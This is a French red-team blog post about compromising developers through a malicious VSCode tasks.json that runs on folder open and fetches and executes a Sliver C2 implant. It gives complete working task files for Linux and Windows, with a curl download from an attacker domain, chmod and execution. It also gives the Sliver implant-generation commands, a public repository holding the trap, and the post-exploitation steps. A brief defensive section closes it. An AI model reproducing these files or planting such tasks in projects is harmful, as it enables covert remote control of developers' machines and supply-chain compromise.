---
published: true
layout: post
title: "VSCode : Comment pirater un développeur en un clic"
description: "Cet article montre comment il est possible de détourner VSCode via le fichier tasks.json pour lui faire télécharger et exécuter un implant."
lang: fr_FR
categories: [CYBERSÉCURITÉ, RED TEAM]
tags: [cybersécurité, initial access, malware, obfuscation, penetration testing, red teaming, tasks.json, vscode, windows]
---
![VSCode : Comment pirater un développeur en un clic](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/illustration_article_vscode_tasks_json.png)

Dans le monde de la cybersécurité et du Red Teaming, les développeurs sont des cibles de choix. Possédant souvent des privilèges élevés, des accès aux pipelines CI/CD et des clés SSH sensibles, leur compromission peut mener à une attaque *supply chain* dévastatrice. Aujourd'hui, nous explorons une technique redoutable : l'utilisation du fichier `tasks.json` de Visual Studio Code pour exécuter un implant du *framework* Sliver.

# Pourquoi cibler Visual Studio Code (VSCode) ?
VSCode est l'éditeur de code le plus utilisé au monde. Pour faciliter le *workflow*, Microsoft a intégré une fonctionnalité nommée *Tasks* (Tâches). Ces tâches permettent d'automatiser des scripts de *build*, de compilation ou de test. Le problème ? Elles permettent l'exécution de commandes arbitraires.

# Scénario d'attaque : Le "One-Click" Compromise
## L'attaque se déroule généralement en quatre phases :
- Hébergement : L'implant Sliver est mis à disposition sur un serveur contrôlé par l'attaquant.
- Ingénierie Sociale : Un dépôt Git attractif (ex: un correctif de bug, un outil open-source populaire ou un projet interne partagé) est créé, incluant le dossier `.vscode/` piégé.
- Action de la victime : Le développeur clone le dépôt et l'ouvre. VSCode affiche une boîte de dialogue demandant : "Do you trust the authors of the files in this folder?". Si la victime accepte, la backdoor s'active.
- Établissement du canal C2 : La tâche télécharge l'implant et établit une session interactive avec le serveur Sliver.

Une simple action de la part de la victime comme ouvrir un dossier ou cloner un dépôt Git malveillant peut déclencher l'exécution d'un *malware* si l'utilisateur accorde sa confiance au *workspace*.

# Sliver C2 : L'outil de prédilection pour l'intrusion
Pour cette démonstration, **Sliver** qui est un *framework* de *Command & Control* (C2) open-source développé par BishopFox sera utilisé. Puissant et modulaire, il est une alternative sérieuse à Cobalt Strike pour les opérations de Red Team.

Lancement du *framework* C2 sliver avec la commande `sliver` :

![lancement_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/lancement_sliver.png)


# Exploitation d'une machine Linux
Tout d'abord, l'implant (le *payload*) doit être généré. Dans le terminal Sliver, la commande suivante est entrée pour créer un binaire Linux communiquant via HTTPS :
```bash
generate --http superdomaine-c2.com --os linux -a amd64 --name vscode-tasks
```
Le résultat est le suivant :

![generation_implant_linux_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/generation_implant_linux_sliver.png)

L'implant est alors visible dans la liste grâce à la commande `implants` :

![affichage_liste_implants_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/affichage_liste_implants_sliver.png)

Afin de réceptionner la connexion entrante du poste compromis, un serveur d'écoute doit être activé sur le serveur C2 grâce à la commande `https` :

![lancement_listener_https_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/lancement_listener_https_sliver.png)

# Exploitation de la fonctionnalité tasks.json
Le vecteur d'attaque se loge dans le répertoire `.vscode/` situé à la racine du projet. Ce dossier contient les configurations spécifiques à l'espace de travail.

## Création de la tâche malveillante
Il est nécessaire de créer un fichier nommé `.vscode/tasks.json` avec la configuration suivante :

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "VS",
      "type": "shell",
      "command": "curl",
      "args": [
        "http://superdomaine-c2.com:8080/vscode-tasks",
        "-o",
        "/tmp/vscode-tasks",
        "&&",
        "chmod",
        "+x",
        "/tmp/vscode-tasks",
        "&&",
        "/tmp/vscode-tasks"
      ],
      "problemMatcher": [],
      "group": {
        "kind": "build",
        "isDefault": true
      },
      "runOptions": {
        "runOn": "folderOpen"
      },
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    }
  ]
}
```

## Analyse technique des paramètres
Le fichier `.vscode/tasks.json` utilise des propriétés natives détournées pour exécuter un implant Sliver sans interaction utilisateur supplémentaire (au-delà de l'acceptation du *Workspace Trust*).
### Mécanisme de déclenchement (*Trigger*)
- `runOn: folderOpen` : C'est l'élément le plus critique. Contrairement aux tâches classiques qui nécessitent une activation manuelle via un raccourci ou le menu, ce paramètre déclenche l'exécution dès que le dossier du projet est chargé par l'éditeur.
- `isDefault: true` : En définissant cette tâche comme tâche de *build* par défaut, elle peut également être déclenchée par les raccourcis clavier standards de compilation (`Ctrl+Shift+B`), augmentant les chances d'exécution.

### Chaînage de l'attaque (*Command & Args*)
La tâche utilise `curl` pour initier une chaîne d'infection multi-étapes sur un système de type Unix (Linux/macOS) :
- Téléchargement : `curl http://superdomaine-c2.com:8080/vscode-tasks -o /tmp/vscode-tasks` récupère l'implant Sliver et l'enregistre dans un répertoire temporaire, souvent moins surveillé et accessible en écriture.
- Élévation de privilèges (exécution) : `chmod +x /tmp/vscode-tasks` rend le fichier téléchargé exécutable.
- Exécution : `/tmp/vscode-tasks` lance l'implant, qui établit alors la connexion vers le serveur C2.
- Utilisation de `&&` : L'opérateur logique assure que chaque étape ne s'exécute que si la précédente a réussi, garantissant la fiabilité de l'infection

### Dissimulation et Furtivité (*Presentation*)
Le bloc `presentation` est configuré pour rendre l'opération totalement invisible pour le développeur :
- `echo: false` : Empêche VSCode d'afficher la commande exécutée dans le terminal interne.
- `reveal: never` : Indique à l'éditeur de ne jamais afficher le panneau de sortie. Même si la tâche produit une erreur ou un message, aucun terminal ne surgira à l'écran.
- `focus: false` : Empêche le curseur de se déplacer vers le terminal, évitant ainsi toute interruption visuelle du flux de travail de la victime.
- `panel: dedicated` : Isole l'exécution dans un panneau spécifique, évitant de polluer les autres terminaux que le développeur pourrait ouvrir manuellement.


Le projet Git est cloné côté victime avec la commande `git clone https://github.com/CLeBeRFR/article-tasks.git` :

![git_clone_projet_backdoor.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/git_clone_projet_backdoor.png)


Lors de l'ouverture du projet dans VSCode, une fenêtre d'avertissement apparaît :

![autorisation_trust_projet_vscode.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/autorisation_trust_projet_vscode.png)

Lorsque l'utilisateur clique sur "*Yes, I trust the authors*", les commandes sont exécutées du côté de la victime et le serveur web côté attaquant reçoit la requête :

![listener_serveur_web.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/listener_serveur_web.png)

Ainsi, lors du lancement de VSCode, aucun élément laisse transparaître l'exécution du binaire :
![affichage_projet_backdoor_vscode.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/affichage_projet_backdoor_vscode.png)

Le listener Sliver réceptionne la *backdoor* :

![reception_listener_linux_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/reception_listener_linux_sliver.png)


Il est possible de visualiser les sessions ouvertes avec la commande Sliver `sessions` :

![affichage_sessions_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/affichage_sessions_sliver.png)

Il est alors possible d'intéragir avec la session en utilisant la commande `use <ID de session>` et par exemple d'exécuter la commande `ls` :

![selection_session_sliver_linux.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/selection_session_sliver_linux.png)

L'attaquant dispose donc d'un contrôle total sur la machine compromise.

# Exploitation d'une machine Windows
L'implant pour Windows est généré via la commande Sliver :
```bash
generate --http superdomaine-c2.com --os windows --format exe -a amd64 --name vscode-tasks-windows
```

Le *framework* renvoie alors le résultat suivant :

![generation_implant_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/generation_implant_windows_sliver.png)


Il est nécessaire d'adapater le fichier JSON `tasks.json` pour qu'il soit compatible avec un système Windows :
```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "VS",
      "type": "shell",
      "command": "curl",
      "args": [
        "-o",
        "C:\\Users\\Public\\vscode-tasks-windows.exe",
        "http://superdomaine-c2.com:8080/vscode-tasks-windows.exe"
      ],
      "problemMatcher": [],
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    },
    {
      "label": "VS2",
      "type": "process",
      "command": "C:\\Users\\Public\\vscode-tasks-windows.exe",
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    },
    {
      "label": "executeboth",
      "dependsOn": ["VS", "VS2"],
      "dependsOrder": "sequence",
      "runOptions": {
        "runOn": "folderOpen"
      },
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    }
    
  ]
}
```

A la différence du premier JSON, ici, trois tâche différentes sont crées :
- La tâche de téléchargement du fichier malveillant
- La tâche de lancement du fichier
- La tâche permettant d'orchestrer les deux premières tâches. Le paramètre (`"dependsOn": ["VS", "VS2"]`) permet de spécifier que cette troisième tâche dépend des deux premières. Enfin, la première (le téléchargement) doit être exécutée avant le lancement du binaire. Cette contrainte est spécifiée grâce au paramètre `"dependsOrder": "sequence"`.


Rien  ne se passe sur VSCode, pourtant, Sliver reçoit bien la connexion :

![affichage_sessions_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/affichage_sessions_windows_sliver.png)

Il est ainsi possible de lister les fichiers de la machine Windows par exemple :

![listing_fichiers_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/listing_fichiers_windows_sliver.png)


Il est également possible de prendre des captures d'écran de la cible :

![capture_ecran_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/capture_ecran_windows_sliver.png)

Ce qui était affiché à l'écran de la victime est alors disponible :
![contenu_capture_ecran_windows_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/contenu_capture_ecran_windows_sliver.png)


# Comment se protéger de l'exploitation du fichier tasks.json dans VSCode
## Détection et Protection (Approche Blue Team)
Cette technique détourne une fonctionnalité légitime, ce qui rend sa détection plus complexe qu'un malware traditionnel. Des mesures de défense spécifiques doivent être appliquées :

## Politique de *Workspace Trust*
Il est crucial d'éduquer les équipes de développement sur la portée du "*Workspace Trust*". Ce mode ne doit être activé que pour des sources vérifiées. En cas de doute, l'ouverture en "*Restricted Mode*" empêche l'exécution automatique des tâches définies dans `tasks.json`.

## Surveillance des processus (EDR / SIEM)
L'analyse des journaux d'évenement (*logs*) doit se concentrer sur les comportements anormaux du processus `code.exe` (VSCode). Le déclenchement de `powershell.exe`, `cmd.exe` ou `bash` par l'éditeur de code, suivi de requêtes réseau vers des domaines externes non répertoriés, constitue un indicateur de compromission (IOC) majeur.

## Audit des dépôts
L'intégration de scans de sécurité automatisés dans les *pipelines* CI/CD peut permettre de détecter la présence de fichiers `tasks.json` suspects contenant des directives `runOn: folderOpen` ou des scripts d'obfuscation.

# Conclusion
L'utilisation de `tasks.json` couplée à un *framework* comme Sliver démontre que la sécurité des outils de travail est aussi critique que celle du code produit. Pour les professionnels de la cybersécurité, ce vecteur souligne l'importance d'une surveillance accrue sur les terminaux des développeurs.